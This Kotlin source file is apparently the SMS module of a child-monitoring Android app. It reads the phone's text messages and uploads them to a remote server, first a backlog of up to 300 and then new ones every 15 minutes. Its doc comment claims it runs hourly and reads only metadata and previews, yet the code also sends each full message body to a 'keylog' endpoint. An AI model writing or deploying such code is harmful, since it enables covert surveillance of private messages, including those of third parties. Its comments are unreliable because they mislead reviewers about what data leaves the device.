package com.example.kidsguardchild.modules

import android.content.Context
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.DataUploader
import com.example.kidsguardchild.core.KeylogBody
import com.example.kidsguardchild.core.MessageBody
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

private const val TAG = "SmsModule"

/**
 * Reads SMS metadata (sender, timestamp, preview) every hour.
 * Does NOT read full message content — only count + preview snippet.
 * Requires READ_SMS permission (restricted on Android 10+ unless default SMS app).
 */
class SmsModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null
    private var lastUploadTime = System.currentTimeMillis() - TimeUnit.HOURS.toMillis(1)

    fun start() {
        job = scope.launch {
            syncHistorical()
            while (isActive) {
                uploadSmsMetadata()
                lastUploadTime = System.currentTimeMillis()
                delay(TimeUnit.MINUTES.toMillis(15))
            }
        }
        Log.d(TAG, "SMS module started")
    }

    /** Upload existing SMS threads (up to 300 recent messages). */
    suspend fun syncHistorical() {
        uploadSmsSince(0, 300)
        Log.i(TAG, "Historical SMS sync done")
    }

    fun stop() {
        job?.cancel()
        Log.d(TAG, "SMS module stopped")
    }

    private suspend fun uploadSmsMetadata() {
        uploadSmsSince(lastUploadTime, 80)
    }

    private suspend fun uploadSmsSince(sinceMs: Long, max: Int) {
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )
        val selection = if (sinceMs > 0) "${Telephony.Sms.DATE} > ?" else null
        val selectionArgs = if (sinceMs > 0) arrayOf(sinceMs.toString()) else null

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                "${Telephony.Sms.DATE} DESC LIMIT $max"
            )

            cursor?.use { c ->
                var count = 0
                while (c.moveToNext() && count < max) {
                    count++
                    val address = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
                    val body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val typeInt = c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE))

                    val channel = when (typeInt) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS Received"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS Sent"
                        else -> "SMS"
                    }

                    // Upload metadata only — first 40 chars of body for preview
                    val preview = if (body.length > 40) body.substring(0, 40) + "..." else body

                    DataUploader.upload("SMS[$address]") {
                        ApiClient.service.postMessage(
                            MessageBody(from = address, channel = channel, preview = preview)
                        )
                    }
                    if (body.isNotBlank()) {
                        DataUploader.upload("Keylog[SMS]") {
                            ApiClient.service.postKeylog(KeylogBody(app = "SMS", text = body))
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS: ${e.message}")
        } finally {
            cursor?.close()
        }
    }
}
